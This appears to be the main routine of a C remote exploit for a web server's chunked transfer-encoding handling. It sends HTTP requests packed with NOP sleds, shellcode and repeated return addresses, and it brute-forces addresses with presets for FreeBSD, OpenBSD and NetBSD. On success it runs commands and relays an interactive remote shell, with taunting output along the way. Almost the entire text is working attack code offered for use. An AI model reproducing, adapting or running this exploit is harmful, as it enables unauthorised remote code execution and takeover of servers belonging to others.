int main(int argc, char *argv[]) {
	char *hostp, *portp, *cmdz = DEFAULT_CMDZ;
	u_char buf[512], *expbuf, *p;
	int i, j, lport, sock;
	int bruteforce, owned, progress, sc_timeout = 5;
	int responses, shown_length = 0;
	struct in_addr ia;
	struct sockaddr_in sin, from;
	struct hostent *he;


	if(argc < 4)
		usage();

	bruteforce = 0;
	memset(&victim, 0, sizeof(victim));
	while((i = getopt(argc, argv, "t:b:d:h:w:c:r:z:o:")) != -1) {
		switch(i) {
			/* required stuff */
			case 'h':
			hostp = strtok(optarg, ":");
			if((portp = strtok(NULL, ":")) == NULL)
				portp = "80";
			break;

			/* predefined targets */
			case 't':
			if(atoi(optarg) >= sizeof(targets)/sizeof(victim)) {
				printf("Invalid target\n");
				return -1;
			}

			memcpy(&victim, &targets[atoi(optarg)], sizeof(victim));
			break;

			/* bruteforce! */
			case 'b':
			bruteforce++;
			victim.type = "Custom target";
			victim.retaddr = strtoul(optarg, NULL, 16);
			printf("Using 0x%lx as the baseadress while bruteforcing..\n", victim.retaddr);
			break;

			case 'd':
			victim.delta = atoi(optarg);
			printf("Using %d as delta\n", victim.delta);
			break;

			case 'r':
			victim.repretaddr = atoi(optarg);
			printf("Repeating the return address %d times\n", victim.repretaddr);
			break;

			case 'z':
			victim.repzero = atoi(optarg);
			printf("Number of zeroes will be %d\n", victim.repzero);
			break;

			case 'o':
			bruteforce++;
			switch(*optarg) {
				case 'f':
				victim.type = "FreeBSD";
				victim.retaddr = 0x80a0000;
				victim.delta = -150;
				victim.repretaddr = 6;
				victim.repzero = 36;
				break;

				case 'o':
				victim.type = "OpenBSD";
				victim.retaddr = 0x80000;
				victim.delta = -146;
				victim.repretaddr = 6;
				victim.repzero = 36;
				break;

				case 'n':
				victim.type = "NetBSD";
				victim.retaddr = 0x080e0000;
				victim.delta = -90;
				victim.repretaddr = 5;
				victim.repzero = 42;
				break;

				default:
				printf("[-] Better luck next time!\n");
				break;
			}
			break;

			/* optional stuff */
			case 'w':
			sc_timeout = atoi(optarg);
			printf("Waiting maximum %d seconds for replies from shellcode\n", sc_timeout);
			break;

			case 'c':
			cmdz = optarg;
			break;

			default:
			usage();
			break;
		}
	}

	if(!victim.delta || !victim.retaddr || !victim.repretaddr || !victim.repzero) {
		printf("[-] Incomplete target. At least 1 argument is missing (nmap style!!)\n");
		return -1;
	}

	printf("[*] Resolving target host.. ");
	fflush(stdout);
	he = gethostbyname(hostp);
	if(he)
		memcpy(&ia.s_addr, he->h_addr, 4);
	else if((ia.s_addr = inet_addr(hostp)) == INADDR_ANY) {
		printf("There'z no %s on this side of the Net!\n", hostp);
		return -1;
	}

	printf("%s\n", inet_ntoa(ia));


	srand(getpid());
	signal(SIGPIPE, SIG_IGN);
	for(owned = 0, progress = 0;;victim.retaddr += RET_ADDR_INC) {
		/* skip invalid return adresses */
		if(memchr(&victim.retaddr, 0x0a, 4) || memchr(&victim.retaddr, 0x0d, 4))
			continue;


		sock = socket(PF_INET, SOCK_STREAM, 0);
		sin.sin_family = PF_INET;
		sin.sin_addr.s_addr = ia.s_addr;
		sin.sin_port = htons(atoi(portp));
		if(!progress)
			printf("[*] Connecting.. ");

		fflush(stdout);
		if(connect(sock, (struct sockaddr *) & sin, sizeof(sin)) != 0) {
			perror("connect()");
			exit(1);
		}

		if(!progress)
			printf("connected!\n");


		p = expbuf = malloc(8192 + ((PADSIZE_3 + NOPCOUNT + 1024) * REP_SHELLCODE)
				    + ((PADSIZE_1 + (victim.repretaddr * 4) + victim.repzero
				    + 1024) * REP_POPULATOR));

		PUT_STRING("GET / HTTP/1.1\r\nHost: " HOST_PARAM "\r\n");

		for (i = 0; i < REP_SHELLCODE; i++) {
			PUT_STRING("X-");
			PUT_BYTES(PADSIZE_3, PADDING_3);
			PUT_STRING(": ");
			PUT_BYTES(NOPCOUNT, NOP);
			memcpy(p, shellcode, sizeof(shellcode) - 1);
			p += sizeof(shellcode) - 1;
			PUT_STRING("\r\n");
		}

		for (i = 0; i < REP_POPULATOR; i++) {
			PUT_STRING("X-");
			PUT_BYTES(PADSIZE_1, PADDING_1);
			PUT_STRING(": ");
			for (j = 0; j < victim.repretaddr; j++) {
				*p++ = victim.retaddr & 0xff;
				*p++ = (victim.retaddr >> 8) & 0xff;
				*p++ = (victim.retaddr >> 16) & 0xff;
				*p++ = (victim.retaddr >> 24) & 0xff;
			}

			PUT_BYTES(victim.repzero, 0);
			PUT_STRING("\r\n");
		}

		PUT_STRING("Transfer-Encoding: chunked\r\n");
		snprintf(buf, sizeof(buf) - 1, "\r\n%x\r\n", PADSIZE_2);
		PUT_STRING(buf);
		PUT_BYTES(PADSIZE_2, PADDING_2);
		snprintf(buf, sizeof(buf) - 1, "\r\n%x\r\n", victim.delta);
		PUT_STRING(buf);
		
		if(!shown_length) {
			printf("[*] Exploit output is %u bytes\n", (unsigned int)(p - expbuf));
			shown_length = 1; 
		}
		
		write(sock, expbuf, p - expbuf);

		progress++;
		if((progress%70) == 0)
			progress = 1;

		if(progress == 1) {
			printf("\r[*] Currently using retaddr 0x%lx", victim.retaddr);
			for(i = 0; i < 40; i ++)
				printf(" ");
			printf("\n");
			if(bruteforce)
				putchar(';');
		}
		else
			putchar(((rand()>>8)%2)? 'P': 'p');


		fflush(stdout);
		responses = 0;
		while (1) {
			fd_set          fds;
			int             n;
			struct timeval  tv;

			tv.tv_sec = sc_timeout;
			tv.tv_usec = 0;

			FD_ZERO(&fds);
			FD_SET(0, &fds);
			FD_SET(sock, &fds);
	
			memset(buf, 0, sizeof(buf));
			if(select(sock + 1, &fds, NULL, NULL, owned? NULL : &tv) > 0) {
				if(FD_ISSET(sock, &fds)) {
					if((n = read(sock, buf, sizeof(buf) - 1)) < 0)
						break;

					if(n >= 1)
					{
						if(!owned)
						{
							for(i = 0; i < n; i ++)
								if(buf[i] == 'G')
									responses ++;
								else
									responses = 0;
							if(responses >= 2)
							{
								owned = 1;
								write(sock, "O", 1);
								write(sock, cmdz, strlen(cmdz));
								printf(" it's a TURKEY: type=%s, delta=%d, retaddr=0x%lx, repretaddr=%d, repzero=%d\n", victim.type, victim.delta, victim.retaddr, victim.repretaddr, victim.repzero);
								printf("Experts say this isn't exploitable, so nothing will happen now: ");
								fflush(stdout);
							}
						} else
  							write(1, buf, n);
  					}
				}

				if(FD_ISSET(0, &fds)) {
					if((n = read(0, buf, sizeof(buf) - 1)) < 0)
						exit(1);

					write(sock, buf, n);
				}

			}

			if(!owned)
				break;
		}

		free(expbuf);
		close(sock);

		if(owned)
			return 0;

		if(!bruteforce) {
			fprintf(stderr, "Ooops.. hehehe!\n");
			return -1;
		}
	}

	return 0;
}